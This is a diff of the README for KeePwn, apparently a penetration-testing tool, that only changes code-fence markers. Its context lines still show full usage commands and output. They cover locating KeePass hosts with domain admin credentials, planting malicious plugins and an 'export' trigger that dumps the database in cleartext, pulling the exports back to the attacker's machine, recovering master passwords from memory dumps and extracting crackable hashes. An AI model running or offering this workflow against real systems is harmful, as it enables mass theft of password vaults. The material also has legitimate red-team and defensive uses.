@@ -59,7 +59,7 @@ python3 KeePwn.py --help
 
 KeePwn's `search` module is used to identify hosts that run KeePass on your target environment:
 
-```bash
+```
 $ python3 KeePwn.py search -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -tf ./targets.txt
 
 [*] Starting remote KeePass search with 5 threads
@@ -80,7 +80,7 @@ This basic search technique should be enough to accurately determine if KeePass 
 
 Various quality of life options are also included to let you export search results to a CSV file, display only targets where KeePass is found and adjust the number of parallel threads:
 
-```bash
+```
 $ KeePwn search -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -tf ./targets.txt --threads 4 --get-process --found-only --output keepwn_out.csv
 
 [*] Starting remote KeePass search with 4 threads
@@ -101,7 +101,7 @@ KeePwn's `plugin` module allows to :
 
 - List currently installed plugins and enumerate the plugin cache
 
-  ```bash
+  ```
   $ KeePwn plugin check -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL                                   
   
   [*] No path specified, searching in default locations..
@@ -111,7 +111,7 @@ KeePwn's `plugin` module allows to :
 
 - Add and remove your malicious plugins
 
-  ```bash
+  ```
   $ KeePwn plugin add -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL --plugin KeeFarceRebornPlugin.dll  
 
   [*] No path specified, searching in default locations..
@@ -123,7 +123,7 @@ KeePwn's `plugin` module allows to :
 
 - Poll %APPDATA% for exports and automatically moves it from remote host to local filesystem
 
-  ```bash
+  ```
   $ KeePwn plugin poll -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL                                  
 
   [*] Polling for database export every 5 seconds.. press CTRL+C to abort. DONE                                                                                                                                                                                
@@ -142,7 +142,7 @@ KeePwn's `trigger` module allows to :
 
 - Check if a malicious trigger named "export" is currently written in KeePass configuration
 
-  ```bash
+  ```
   $ KeePwn trigger check -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL       
 
   [*] No KeePass configuration path specified, searching in default locations..
@@ -156,7 +156,7 @@ KeePwn's `trigger` module allows to :
 
 - Add and remove a malicious trigger named "export" which performs a cleartext export of the database in %APPDATA% on next KeePass launch
 
-  ```bash
+  ```
   ❯ python3 KeePwn.py trigger add -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL       
 
   [*] No KeePass configuration path specified, searching in default locations..
@@ -168,7 +168,7 @@ KeePwn's `trigger` module allows to :
 
 - Poll %APPDATA% for exports and automatically moves it from remote host to local filesystem
 
-  ```bash
+  ```
   $ KeePwn trigger poll -u 'Administrator' -p 'P@$$w0rd!!' -d 'COMPANY.LOCAL' -t PC03.COMPANY.LOCAL                                  
 
   [*] Polling for database export every 5 seconds.. press CTRL+C to abort. DONE                                                                                                                                                                                
@@ -185,7 +185,7 @@ As described by [@vdohney](https://github.com/vdohney/keepass-password-dumper), 
 
 KeePwn `parse_dump` module will search for potential master password candidates in dumps. Because the resulting strings will (by design) be incomplete, the module can also be used to bruteforce the missing first character against a specified KDBX file.
 
-```bash
+```
 $ python3 KeePwn.py parse_dump -d ./KeePass.DMP --bruteforce Database.kdbx
 
 [*] Searching for the master password in memory dump.. done!                                                                                                                                                                                                 
@@ -219,7 +219,7 @@ keepass2john.py script by [@harmjoy](https://github.com/HarmJ0y) was ported to K
 
 KeePwn `convert` will extract a crackable hash (john or hashcat format) from a KeePass Database. 
 
-```bash
+```
 KeePwn convert -d ./Database.kdbx 
 
 [+] Happy cracking! (hashcat -m 13400)
@@ -228,7 +228,7 @@ $keepass$*2*60000*222*b794eae002aff2a55a307bedeadebee210ee3c3596731f5acf2a1ff3ad
 
 It can be used with more arguments to specify the expected hash type as well as an output file path:
 
-```bash
+```
 KeePwn convert -d ./Database.kdbx -t john -o ./Database.hash 
 
 [+] Hash written to ./Database.hash, happy cracking! (john --format=keepass)
